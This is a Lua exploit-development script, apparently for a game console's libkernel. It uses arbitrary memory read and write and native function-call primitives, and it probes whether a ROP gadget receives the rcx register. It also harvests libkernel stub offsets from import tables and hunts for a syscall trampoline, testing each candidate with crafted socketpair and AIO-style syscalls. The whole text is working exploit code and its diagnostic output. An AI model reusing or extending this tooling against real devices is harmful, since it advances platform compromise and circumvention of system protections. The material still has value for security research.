-- CRASH_CLASS: MEDIUM
-- PROBE 1213b: (A) does rcx actually reach the callee through native.fcall_with_rax?
--              (B) if yes, find the >=4-argument libkernel stub whose +7 is "mov r10, rcx".
--
-- 1213a harvested 96 distinct libkernel offsets out of libc's import window and verified 8
-- of them (0x3B0 0x3F0 0x410 0xB50 0xB70 0xD50 0xFF0 0x10F0) as real stubs by asking
-- stub+7 for our own pid. All 8 then answered EINVAL 22 to 663 mode 0, which has two
-- possible readings:
--   (a) every one of them is a 2/3-argument stub and the >=4-argument ones live in the
--       big cluster at 0x13000..0x16000 that 1213a never tested, or
--   (b) the native fcall handler does not marshal rcx at all, so even a correct
--       "mov r10, rcx" trampoline would receive garbage.
-- Phase A settles (b) with a gadget, before anything expensive happens.

print("=== PROBE 1213b: rcx marshalling, then the big stub cluster ===")

local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function hexn(a) local hi=math.floor(a/4294967296) return string.format("0x%08X%08X",hi,a-hi*4294967296) end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rq(a) local ok,v=pcall(function() return N(memory.read_qword(a)) end) if ok then return v end return nil end

local pid0 = N(mk(20)())
local lk   = N(libkernel_base)
local eb   = N(eboot_base)
local imp  = N(libc_addrofs.gettimeofday_import)
print(string.format("[0] pid=%d libkernel=%s eboot=%s", pid0, hexn(lk), hexn(eb)))

-- ---------------------------------------------------------------- A: rcx oracle
-- eboot+0xCC627 is "48 89 c8 c3" = mov rax, rcx ; ret (verified in the 1 MB dump),
-- and 0xD5878 is the same pattern. A pure register gadget: if rcx arrives, rax comes back.
print("[A] rcx marshalling through native.fcall_with_rax")
local gadgets = { 0xCC627, 0xCC657, 0xD5878 }
for i = 1, #gadgets do
    local g = eb + gadgets[i]
    local ok, v = pcall(function() return N(native.fcall_with_rax(g, 0, 0x1111, 0x2222, 0x3333, 0x4444, 0x5555, 0x6666)) end)
    print(string.format("    gadget eboot+0x%X -> ok=%s rax=0x%X (0x4444 means rcx arrived)", gadgets[i], tostring(ok), ok and v or 0))
end
-- control: same gadget with rcx = 0
local ok0, v0 = pcall(function() return N(native.fcall_with_rax(eb + 0xCC627, 0, 0, 0, 0, 0, 0, 0)) end)
print(string.format("    control rcx=0 -> ok=%s rax=0x%X", tostring(ok0), ok0 and v0 or 0))

-- ---------------------------------------------------------------- B: libkernel segment map
local mi = memory.alloc(0x300)
local gmi = fcall(libc_addrofs.sceKernelGetModuleInfoFromAddr)
local rv = gmi(libkernel_base, 1, mi):tonumber()
print(string.format("[B] GetModuleInfoFromAddr(libkernel) = 0x%X", rv))
for off = 0x100, 0x1A0, 0x8 do
    local v = rq(mi + off)
    if v then print(string.format("      lk_mi+0x%03X = %s", off, hexn(v))) end
end

-- ---------------------------------------------------------------- C: harvest everything
local seen, order = {}, {}
local function harvest(lo, size, tag, cap)
    local scanned, off = 0, 0
    while off < size and scanned < cap do
        local want = math.min(0x8000, size - off)
        local ok, buf = pcall(function() return memory.read_buffer(lo + off, want) end)
        if not ok then print(string.format("  [%s] read stopped at +0x%X", tag, off)) return end
        local i = 1
        while i + 7 <= want do
            local q = N(uint64.unpack(buf:sub(i, i + 7)))
            if q >= lk and q < lk + 0x200000 then
                local o = q - lk
                if not seen[o] then seen[o] = 0 order[#order + 1] = o end
                seen[o] = seen[o] + 1
            end
            i = i + 8
        end
        scanned = scanned + want off = off + want
    end
    print(string.format("  [%s] scanned 0x%X bytes of %s, %d offsets", tag, scanned, hexn(lo), #order))
end
harvest(imp - 0x2000, 0x4000, "libc", 0x4000)
local ebmi = memory.alloc(0x300)
gmi(eboot_base, 1, ebmi)
for k = 0, 3 do
    local base = rq(ebmi + 0x160 + 0x10 * k)
    local size = rq(ebmi + 0x168 + 0x10 * k)
    if base and size and size > 0 and size <= 0x2000000 and base >= 0x10000 and base ~= eb then
        harvest(base, size, "seg" .. k, 0x100000)
    end
end
table.sort(order)
print(string.format("[C] %d offsets total", #order))
local l = ""
for i = 1, #order do
    l = l .. string.format("%X ", order[i])
    if #l > 140 then print("    " .. l) l = "" end
end
if #l > 0 then print("    " .. l) end

-- ---------------------------------------------------------------- D: trampoline hunt
print("[D] verify with getpid, then 663 mode 0. offsets are printed before each call, so a")
print("    crash still names the candidate that did it.")
local tested, good, found = 0, {}, nil
local function test_mode0(stub)
    local sv = memory.alloc(8) wd(sv, 0) wd(sv + 4, 0)
    pcall(function() return mk(135)(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
    local fd0 = rd(sv)
    if fd0 <= 0 then return nil, "no socketpair" end
    local reqs = memory.alloc(0x28 * 2)
    local ids  = memory.alloc(16)
    local out  = memory.alloc(16)
    local tb   = memory.alloc(8)
    local buf  = memory.alloc(0x100)
    local ba = 0
    do local ok, v = pcall(function() return N(uint64(buf)) end) if ok then ba = v end end
    for i = 0, 0x28 * 2 - 1, 4 do wd(reqs + i, 0) end
    for i = 0, 1 do
        local r = reqs + i * 0x28
        wd(r + 0x08, 0x10)
        wd(r + 0x10, ba % 4294967296) wd(r + 0x14, math.floor(ba / 4294967296))
        wd(r + 0x20, fd0)
    end
    wd(ids, 0) wd(ids + 4, 0)
    mk(669)(uint64(0x1001), uint64(reqs), uint64(2), uint64(3), uint64(ids))
    wd(tb, 2000)
    local ok = pcall(function() return native.fcall_with_rax(stub, 663, ids, 2, out, 0, tb, 0) end)
    return ES(), string.format("out=%08X/%08X ok=%s", rd(out), rd(out + 4), tostring(ok))
end

for i = 1, #order do
    local o = order[i]
    if o % 0x10 == 0 and o >= 0x1000 and o < 0x200000 and o ~= 0xB50 then
        io.write("") -- no-op, keeps Lua 5.1 happy in some builds
        print(string.format("   -> off=0x%X testing getpid via +7", o))
        local ok, v = pcall(function() return N(native.fcall_with_rax(lk + o + 7, 20, 0, 0, 0, 0, 0, 0)) end)
        if ok and v == pid0 then
            print(string.format("      STUB off=0x%X", o))
            local e, detail = test_mode0(lk + o + 7)
            print(string.format("      mode0 err=%s %s", tostring(e), detail))
            if e and not e:match("^22") then found = o print("      *** ARG4 ARRIVED ***") break end
        else
            print(string.format("      not a stub: ok=%s pid=%s", tostring(ok), tostring(v)))
        end
        tested = tested + 1
        if tested >= 26 then print("   (candidate cap reached)"); break end
    end
end

if found then
    print(string.format("[D] trampoline = libkernel + 0x%X (stub+7)", found))
    local e = test_mode0(lk + found + 7)
    print("    re-check mode0 err=" .. tostring(e))
else
    print("[D] no >=4-argument stub found in the reachable import tables")
end
print("=== DONE ===")
